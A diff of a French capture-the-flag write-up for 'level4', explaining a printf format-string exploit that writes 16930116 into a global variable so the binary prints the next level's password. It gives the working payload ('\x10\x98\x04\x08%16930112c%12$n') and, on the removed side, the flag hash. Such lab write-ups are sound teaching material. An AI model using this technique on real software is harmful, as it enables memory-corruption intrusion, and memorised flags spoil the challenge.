@@ -1,41 +1,30 @@
-on vois un fichier level4
-dans le cat level4 on voit 
-[�/bin/cat /home/user/level5/.pass@|���\���������������� �����9�u߃�[^_]��
+On décompile le programme et on voit qu'il y a un appelle à 
+system("/bin/cat /home/user/level5/.pass"). C'est parfait car ça affiche 
+directement le mot de passe. Il va donc s'agir d'executer cette ligne. 
 
-quand je decompile level4
+On voit qu'il y a un check d'une variable m, et que si cette variable a la bonne
+valeur, on execute directement le cat. On va donc devoir mettre la valeur de 
+vérification (16930116) dans cette variable. 
 
-void p(char *param_1)
+On peut faire ça comme dans l'exercice d'avant avec le printf, qui prend un format 
+par l'entrée standard. Avec objdump, on trouve que la variable a une adresse de 
+0x08049810. 
 
-{
-  printf(param_1);
-  return;
-}
+On va utiliser le format %n de printf, qui écrit le nombre de caractères écrit 
+à une adresse spécifiée en paramètre. Les paramètres sont stockés sur la stack, 
+tout comme la buffer qui provient de l'entrée standard. Il est donc possible de 
+fournir à printf une adresse où il écrira, par l'entrée standard. De manière empirique
+on trouve que le premier octet du buffer est accèssible par printf en tant que 
+l'argument à l'index 12. 
 
-void n(void)
+On construit donc notre payload de la façon suivante :
+-les quatre octets de l'adresse de la variable que l'on veut modifier, 
+ en ordre little-Endian
+-la chaîne %16930112c, qui cause l'écriture de 16930112 espaces; comme on a déjà 
+ écrit 4 caractères avec l'adresse, cela fait qu'on a écrit en tout 16930116 
+ caractères, ce qui est la valeur que l'on veut écrire
+-la chaîne %12$n, ce qui correspond à effecture un %n sur le 12è élément de la stack
 
-{
-  char local_20c [520];
-  
-  fgets(local_20c,0x200,stdin);
-  p(local_20c);
-  if (m == 0x1025544) {
-    system("/bin/cat /home/user/level5/.pass");
-  }
-  return;
-}
-
-il faut exploiter la meme faille mais cette fois ci avec 16930116 char
-
-je test avec ca
-[adresse de m en format Little-Endian]%[nombre de char]c%[offset]$n
-
-l'adresse de m est 0x8049810 en utilisant %x pleins de fois on trouve l'offset qui pointe vers m
-ici 12
-on a alors "echo -e '\x10\x98\x04\x08%16930112c%12$n' > /tmp/exploit"
-
-puis ./level4 < /tmp/exploit
-apres avoir print l'adresse (4char) puis 16930112 espaces met 16930116 dans m grace a %m
-%c sans arg est un espace par defaut
-
-et on a notre flag
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+La commande d'attaque est donc :
+python -c 'print("\x10\x98\x04\x08" + "%16930112c%12$n")' | ./level4
+On obtient directement le flag. 
